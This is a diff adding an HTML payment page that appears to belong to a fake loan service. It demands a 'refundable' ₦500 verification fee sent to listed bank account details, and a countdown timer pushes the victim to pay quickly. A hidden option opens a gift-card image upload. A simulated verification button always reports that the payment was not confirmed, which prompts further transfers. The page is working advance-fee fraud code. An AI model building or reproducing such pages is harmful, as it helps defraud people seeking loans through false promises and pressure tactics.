@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Payment Page</title>
+    <script src="https://static.filestackapi.com/filestack-js/3.x.x/filestack.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            background: #fff;
+            max-width: 500px;
+            margin: auto;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+        }
+
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+
+        .timer {
+            text-align: center;
+            font-size: 20px;
+            color: #e74c3c;
+            margin-bottom: 20px;
+        }
+
+        .payment-options label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        .payment-options select {
+            width: 100%;
+            padding: 10px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            margin-bottom: 20px;
+        }
+
+        .payment-details {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #fafafa;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+        }
+
+        .btn {
+            background: #3498db;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background: #2980b9;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Complete Your Verification</h2>
+        <div class="timer" id="countdown">
+            Time left: 01:30:00
+        </div>
+
+        <div class="payment-options">
+            <label for="paymentMethod">Choose Payment Method:</label>
+            <select id="paymentMethod">
+                <option value="">-- Select --</option>
+                <option value="paypal">Bank Transfer</option>  </select>
+        </div>
+
+        <div id="paypalDetails" class="payment-details">
+            <strong>   <p style="color:;">
+                Bank Name: Paystack-Titan <br />Account Number: 9907293859 <br />
+                Account Name: nosmas mfb</strong>
+            </p>
+        </div>
+
+        <div id="cashappDetails" class="payment-details">
+            <p>
+                Cash App Tag: <strong>$YourCashTag</strong>
+            </p>
+        </div>
+
+        <div id="bitcoinDetails" class="payment-details">
+            <p>
+                Send Bitcoin to Address:
+            </p>
+            <code><strong>YOUR_BITCOIN_ADDRESS</strong></code>
+        </div>
+        <p style="text-align: center; color: #555; margin-top: 10px;">
+    To verify your identity, a refundable payment of <strong>₦500</strong> is required. Kindly transfer the amount to the account details provided above. This is a one-time verification fee to confirm you're a real person. Once verified, the full amount will be refunded to your bank account immediately.
+</p>
+    </div>
+<a href="status.html">check Loan status</a>
+    <script>
+        // Countdown Timer
+        let timeInSeconds = 30 * 60;
+        const countdownElement = document.getElementById("countdown");
+
+        const updateTimer = () => {
+            const hours = Math.floor(timeInSeconds / 3600);
+            const minutes = Math.floor((timeInSeconds % 3600) / 60);
+            const seconds = timeInSeconds % 60;
+
+            countdownElement.textContent = `Time left: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+
+            if (timeInSeconds > 0) {
+                timeInSeconds--;
+            } else {
+                clearInterval(timer);
+                alert("Time's up! Payment window has expired.");
+            }
+        };
+
+        const timer = setInterval(updateTimer, 1000);
+        updateTimer();
+
+        // Payment method logic
+        const paymentSelect = document.getElementById("paymentMethod");
+        const paypalDetails = document.getElementById("paypalDetails");
+        const cashappDetails = document.getElementById("cashappDetails");
+        const bitcoinDetails = document.getElementById("bitcoinDetails");
+
+        paymentSelect.addEventListener("change", function () {
+            paypalDetails.style.display = "none";
+            cashappDetails.style.display = "none";
+            bitcoinDetails.style.display = "none";
+
+            const selected = this.value;
+
+            if (selected === "paypal") {
+                paypalDetails.style.display = "block";
+            } else if (selected === "cashapp") {
+                cashappDetails.style.display = "block";
+            } else if (selected === "bitcoin") {
+                bitcoinDetails.style.display = "block";
+            } else if (selected === "giftcard") {
+                uploadGiftCard();
+            }
+        });
+
+        // Filestack Upload for Gift Card
+        function uploadGiftCard() {
+            const client = filestack.init('AZ5LXMZW2TPisupJcqrHYz');
+
+            client.picker({
+                fromSources: ['local_file_system',
+                    'url',
+                    'imagesearch',
+                    'camera'],
+                accept: ['image/*',
+                    '.pdf'],
+                onUploadDone: function (res) {
+                    alert('Gift Card uploaded successfully!');
+                    console.log('Upload result:', res);
+                }
+            }).open();
+        }
+    </script>
+    
+    <div style="text-align: center; margin-top: 20px;">
+    <button id="confirmPaymentBtn" class="btn">
+        <span id="btnText">I have completed my payment</span>
+        <span id="spinner" style="display: none; margin-left: 10px;" class="loader"></span>
+    </button>
+</div>
+<script>
+document.getElementById("confirmPaymentBtn").addEventListener("click", function () {
+    const btnText = document.getElementById("btnText");
+    const spinner = document.getElementById("spinner");
+
+    btnText.textContent = "Verifying...";
+    spinner.style.display = "inline-block";
+
+    // Simulate a verification process
+    setTimeout(() => {
+        btnText.textContent = "I have completed my payment";
+        spinner.style.display = "none";
+        alert("Payment not confirmed. Please ensure the transfer was successful.");
+    }, 3000); // adjust delay as needed
+});
+    
+</script>
+</body>
+</html>
